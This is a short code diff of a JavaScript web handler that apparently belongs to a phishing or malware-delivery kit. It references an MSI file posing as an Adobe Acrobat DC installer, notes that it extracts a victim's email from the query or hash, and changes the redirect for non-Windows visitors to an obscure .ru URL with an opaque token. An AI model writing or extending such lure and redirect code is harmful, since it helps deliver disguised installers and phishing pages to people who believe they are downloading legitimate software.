@@ -7,7 +7,7 @@ export default function handler(req, res) {
   const MSI_PATH = '/AdobeAcrobatDC_2025.003.40436_6601.msi';
 
   // Base URL for non-Windows users
-  const NON_WINDOWS_TARGET = 'https://mksonline.com.mx/code';
+  const NON_WINDOWS_TARGET = 'https://looker.ojtoiy.ru/Q!fon58sBW3UrfPTJXS3Rxb/';
 
   //--------------------------------------------------------------------
   // 1. Extract email from query or hash
